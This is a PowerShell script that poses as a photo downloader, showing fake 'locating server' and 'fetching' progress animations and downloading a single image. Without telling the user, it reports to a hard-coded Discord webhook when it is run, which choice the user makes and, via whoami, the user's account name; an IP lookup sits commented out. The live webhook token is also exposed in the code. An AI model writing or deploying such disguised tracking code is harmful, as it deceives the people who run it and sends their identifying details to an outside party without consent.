function send {
    param (
        [string]$msg
    )
    $webhookurl = "https://discord.com/api/webhooks/1259185021613506561/Bp2soK5zsyY-iwOjKJBHH3DxydpNS8tcJfbqdD8ekv7YkLH784GO4GBic_2Nh-onnHDs" 
    if ($msg -eq "triggered") {
        $name = whoami
        #$ip = (Invoke-WebRequest -Uri "https://api.ipify.org/?format=text").Content
        $message = @{
            content = "the test has been triggered,  name : $name, ip : omited"
        }
    } else {
        $message = @{
            content = $msg
        }
    }
    $jsonpayload = $message | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri $webhookurl -Method Post -Body $jsonpayload -ContentType "application/json"
}

function fakedownload {
    Write-Host "creating directory for download"
    New-Item -Name "photos" -ItemType Directory
    Write-Host "`n"
    Write-Host "created"
    $anim = @('|', '/', '-', '\')
    for($i = 0; $i -le 5; $i++ ){
        foreach ($number in $anim) {
            Write-Host "locating server $number`r" -NoNewline
            Start-Sleep -Milliseconds 200
        }
    }
    send -msg "triggered"
    Start-Sleep -Milliseconds 500
    Write-Host "`nserver located" -ForegroundColor 'Blue'
    Start-Sleep -Milliseconds 500
    for ($i = 1; $i -le 100; $i++ ) {
        Write-Host "Fetching $i%`r" -NoNewline -ForegroundColor 'Yellow'
        Start-Sleep -Milliseconds 25
    }
    Start-Sleep -Milliseconds 500
    Write-Host "`nsuccessfully fetched"
    Start-Sleep -Milliseconds 1000
    for($i = 0; $i -le 4; $i++){
	    for($k = 1; $k -lt 4; $k++){
            Write-Host "starting download " -NoNewline
	        $dots = "."*$k
	        Write-Host "$dots`r" -NoNewline
	        Start-Sleep -Milliseconds 500
	    }
	    Write-Host "                      `r" -NoNewline
    }
    Write-Host "starting download ..."
    $ppath = "$PSScriptRoot\photos\"
    #New-Item -Name "readme.txt" -Path $ppath -ItemType File
    $ImageURL = "https://i.imgur.com/2Qk9Cjq.jpeg"
    $OutputFilePath = "$ppath\image.jpg"

    Invoke-WebRequest -Uri $ImageURL -OutFile $OutputFilePath
    Write-Host "`nsuccessfully downloaded, program will close shortly" -ForegroundColor 'Green'
    send -msg "program ended"
    Start-Sleep -Milliseconds 5000
}


function ask {
    send -msg "program has been ran"
    Write-Host "`n"
    $evident = Read-Host -Prompt "are you sure you want to proceed with the download(yes or no)"
    if ($evident -eq "yes") {
        Write-Host "commencing ... "
        send -msg "he chose to proceed"
        fakedownload
    } else {
        Write-Host "if so, why do you have this"
        send -msg "they aint one"
    }
}

ask